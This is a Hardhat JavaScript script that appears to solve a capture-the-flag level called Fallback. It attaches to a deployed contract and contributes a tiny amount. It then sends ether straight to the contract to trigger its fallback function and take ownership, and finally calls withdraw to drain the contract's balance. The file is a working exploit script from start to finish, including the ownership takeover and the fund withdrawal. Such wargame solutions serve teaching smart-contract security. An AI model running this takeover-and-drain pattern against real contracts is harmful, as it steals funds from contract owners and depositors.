/* eslint-disable space-before-function-paren */
/* eslint-disable no-undef */
const hre = require('hardhat');
const { deployed } = require('./deployed');
const INSTANCE = "0xF36129cD587e96C3a4A97216Fc0543119bA91D00"

async function main() {
 
  console.log('SET UP\n')
  const [deployer] = await ethers.getSigners();

  // We get the contract to deploy
  const Fallback = await ethers.getContractFactory('Fallback');
  const contract = Fallback.attach(INSTANCE)
  // we recup informations
  const owner = await contract.owner()
  console.log(`owner of the contract: ${owner}`)
  const ownerContribution = await contract.contributions(owner).then(result => ethers.utils.formatEther(result))
  console.log(`owner's contributions: ${ownerContribution} ETH \n\n`)

  // 1st step contribute to the pool
  console.log("STEP 1\n")
  console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result ), "ETH"))

  const tx = await contract.contribute({value: ethers.utils.parseEther('0.0001')})
  console.log("tx sent, waiting for confimation..\n")
  await tx.wait()
  console.log("Transaction confirmed !")
  console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result) ), "ETH\n\n")


  // 2nd make sure we have contributed successfully then send a transaction to get to fallback and claim ownership
  console.log("STEP 2\n")
  const myContribution = await contract.contributions(deployer.address).then(result => ethers.utils.formatEther(result))
  if (myContribution > 0) {
    const tx2 = await deployer.sendTransaction({to: INSTANCE, value: ethers.utils.parseEther('0.1')})
    console.log("tx sent, waiting for confimation..\n")
    await tx2.wait()
    console.log("Transaction confirmed !")
    console.log("owner:", await contract.owner())
    console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result) ), "ETH\n\n")
  } else {
    console.log(`Contribution is 0, my contribution: ${myContribution}`)
  }

  // withdraw our money ehehe
  console.log("STEP 3\n")
  const tx3 = await contract.withdraw()
  await tx3.wait()
  console.log("My balance:", await deployer.getBalance().then(result => ethers.utils.formatEther(result) ), "ETH\n")
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
